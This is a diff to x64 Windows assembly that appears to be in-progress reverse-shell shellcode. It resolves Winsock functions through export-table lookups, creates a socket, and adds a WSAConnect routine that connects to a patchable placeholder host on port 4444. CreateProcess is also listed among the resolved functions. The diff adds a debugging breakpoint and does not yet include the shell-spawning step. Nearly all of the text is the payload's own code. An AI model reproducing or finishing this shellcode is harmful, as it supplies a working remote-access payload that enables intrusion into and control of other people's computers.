@@ -20,15 +20,26 @@ main proc
     jne exit                ; failed
     
     call socket             ; setup socket
+    cmp rax, -1h            ; check result 
+    je  cleanup             ; failed INVALID_SOCKET
+    
+    mov socket_fd, rax    ; save socket fd
+    
+    call connect            ; connect socket
     cmp rax, 0h             ; check result
-    jl  exit                ; failed
-    
-    mov [socket_fd], eax    ; save socket fd
-    
+    jne cleanup             ; failed
     
 
 cleanup:
-        
+    
+    lea rcx, ws2_32_dll
+    call r15                ;load ws2_32.dll
+
+    lea rdx, wsa_cleanup_func
+    lea rcx, ws2_32_dll
+    call lookup_api         ; get address of WSACleanup
+    
+    call rax                ; WSACleanup
     
 exit:
 
@@ -50,16 +61,16 @@ startup proc
     mov rbp, rsp
 
     sub rsp, 1c0h                   ; allocate space (local 198h for WSADATA + 28h shadow space)
-    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned   B
+    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned   
 
     lea rcx, ws2_32_dll
-    call rax                ;load ws2_32.dll
+    call r15                ;load ws2_32.dll
 
     lea rdx, wsa_startup_func
     lea rcx, ws2_32_dll
     call lookup_api         ; get address of WSAStartup
 
-    lea rdx, [rbp-8]        ; lpWSAData
+    lea rdx, [rbp-30h]      ; lpWSAData skip shadow & return addr
     mov rcx, 2d             ; wVersionRequired
     call rax                ; WSAStartup
     
@@ -75,18 +86,19 @@ socket proc
     push rbp
     mov rbp, rsp
     
+    int 3
+    
     ; allocate space
-     
     sub rsp, 30h                   ; allocate space (28h shadow + GROUP 4h + dwFlags 4h)
-    and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned   B
+    and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned   
     
     lea rcx, ws2_32_dll
-    call rax                ;load ws2_32.dll
-    
+    call r15                ;load ws2_32.dll
+        
     lea rdx, wsa_socketa_func
     lea rcx, ws2_32_dll
     call lookup_api         ; get address of WSASocketA
-    
+        
     xor rbx, rbx
     mov [rbp-28h], rbx       ; dwFlags
     mov [rbp-2ch], rbx       ; group 
@@ -105,6 +117,44 @@ socket proc
 
 socket endp
 
+connect proc
+
+    push rbp
+    mov rbp, rsp
+    
+    ; allocate space
+    sub rsp, 50h                   ; allocate space (28h shadow + sockaddr 10h + last args 18h)
+    and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned   
+    
+    lea rcx, ws2_32_dll
+    call r15                ;load ws2_32.dll
+        
+    lea rdx, wsa_connect_func
+    lea rcx, ws2_32_dll
+    call lookup_api         ; get address of WSAConnect
+    
+    mov ebx, [host_addr]    ; host addr
+    mov [rbp-28h], ebx
+    mov bx, [port]         ; port
+    mov [rbp-24h], bx
+    xor rbx, rbx
+    add bx, 2h
+    mov [rbp-22h], bx        ; family type
+    lea rdx, [rbp-28h]      ; sockaddr
+    
+    lea r9, [rbp-48h]       ; lpCallerData
+    mov r8, 10h             ; namelen 16 bytes
+    mov ecx, [socket_fd]    ; socket
+    
+    call rax                ; WSAConnect
+    
+    add rsp, 50h           ; deallocate stack space
+    
+    leave
+    ret
+
+connect endp
+
 ; required dlls
 kernel32_dll        db  'KERNEL32.DLL', 0
 ws2_32_dll          db  'WS2_32.DLL', 0
@@ -112,13 +162,18 @@ ws2_32_dll          db  'WS2_32.DLL', 0
 ; required functions
 loadlib_func        db  'LoadLibraryA', 0
 wsa_startup_func    db  'WSAStartup', 0
+wsa_cleanup_func    db  'WSACleanup', 0
 wsa_socketa_func    db  'WSASocketA', 0
-connect_func        db  'connect', 0
+wsa_connect_func    db  'WSAConnect', 0
 create_process_func db  'CreateProcess', 0
 exitproc_func       db  'ExitProcess', 0
 ;exitthread_func    db  'ExitThread', 0
 
-; globals
+; initialized
+host_addr           dd  0ffffffffh        ; placeholder that can be changed dynamically in shellcode
+port                dw  5c11h            ; 4444d
+
+; uninitialized
 socket_fd           dd  ?
  
 ;look up address of function from DLL export table
